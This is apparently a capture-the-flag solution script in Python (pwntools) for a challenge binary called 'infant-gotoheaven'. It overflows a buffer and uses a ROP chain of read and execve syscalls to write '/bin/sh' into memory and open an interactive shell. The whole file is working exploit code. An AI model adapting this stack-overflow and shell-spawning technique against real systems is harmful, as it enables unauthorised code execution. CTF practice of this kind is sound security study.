from pwn import *
import sys


Host = 'bamboofox.cs.nctu.edu.tw'
Port = 58796

if len(sys.argv) == 1:
    r = process('./infant-gotoheaven')#, env={'LD_PRELOAD': ''})
else:
    r = remote(Host, Port)


data = 0x548800
pop_rax = 0x0000000000404656
pop_rsi = 0x0000000000408497 # dec ptr [rax+0x21]
pop_rdx = 0x0000000000451b72 
sub_rdi = 0x0000000000453cb4 # sub rdi, rsi ; shl rdi, cl ; sete byte ptr [rax] ; ret
pop_rcx = 0x000000000040a1f4
syscall = 0x00000000004553e9

r.recvuntil('text : ')

payload = 'A'*0xe0
payload += p64(pop_rax) + p64(data)
payload += p64(pop_rsi) + p64(data)
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdx) + p64(8)
payload += p64(syscall)

payload += p64(pop_rcx) + p64(0)
payload += p64(pop_rax) + p64(data+0x20)
payload += p64(pop_rsi) + p64(0xffffffffffab7800) # set rsi to -data
payload += p64(sub_rdi) 
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)

r.sendline(payload)

sleep(1)
r.send('/bin/sh\x00')



r.interactive()

